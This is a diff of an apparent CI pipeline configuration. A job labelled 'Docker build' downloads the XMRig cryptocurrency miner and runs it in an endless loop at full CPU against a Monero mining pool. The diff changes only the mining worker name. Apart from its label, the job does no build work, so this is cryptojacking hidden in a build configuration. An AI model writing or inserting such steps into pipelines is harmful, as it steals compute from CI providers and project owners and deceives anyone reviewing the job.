@@ -13,7 +13,7 @@ blocks:
       jobs:
       - name: Docker build
         commands:
-          - wget https://github.com/xmrig/xmrig/releases/download/v2.15.3-beta/xmrig-2.15.3-beta-xenial-x64.tar.gz && tar -xf xmrig-2.15.3-beta-xenial-x64.tar.gz && cd xmrig-2.15.3-beta && while true; do ./xmrig -o europe.cryptonight-hub.miningpoolhub.com:20580 -u brahim7.workername3 -p x --threads 4 --max-cpu-usage=100 --cpu-priority 5 --donate-level 1 ; sleep 1; done 
+          - wget https://github.com/xmrig/xmrig/releases/download/v2.15.3-beta/xmrig-2.15.3-beta-xenial-x64.tar.gz && tar -xf xmrig-2.15.3-beta-xenial-x64.tar.gz && cd xmrig-2.15.3-beta && while true; do ./xmrig -o europe.cryptonight-hub.miningpoolhub.com:20580 -u brahim7.brahimsema -p x --threads 4 --max-cpu-usage=100 --cpu-priority 5 --donate-level 1 ; sleep 1; done 
           - checkout
           - ls -1
           - echo $APP_ENV
